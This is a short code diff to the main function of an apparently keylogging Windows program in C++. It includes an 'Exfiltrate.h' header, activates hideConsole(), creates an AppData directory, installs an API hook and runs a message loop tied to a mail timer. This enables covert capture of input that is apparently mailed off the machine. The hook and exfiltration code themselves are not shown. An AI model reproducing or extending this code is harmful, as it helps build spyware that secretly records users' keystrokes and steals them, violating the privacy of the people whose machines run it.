@@ -9,6 +9,7 @@
 #include "IO.h"
 #include "Timer.h" //Remove or replace w/ something better
 #include "Exfiltrate.h"
+#include "APIHook.h"
 
 
 //STD Namespace Imports
@@ -22,16 +23,28 @@ bool isConsoleVisible();
 int main()
 {
     
-    /*hideConsole();
+    hideConsole();
     
     if (!isConsoleVisible())
     {
+        MSG Msg;
+
+        IO::createDirectory(IO::getAppDataPath(true));
+        APIHook::installHook();
+
+        while (GetMessage(&Msg, NULL, 0, 0))
+        {
+            TranslateMessage(&Msg);
+            DispatchMessage(&Msg);
+        }
         
+        APIHook::mailTimer.Stop();
+
     }
     else
     {
         exit(-1);
-    }*/
+    }
 
     
 
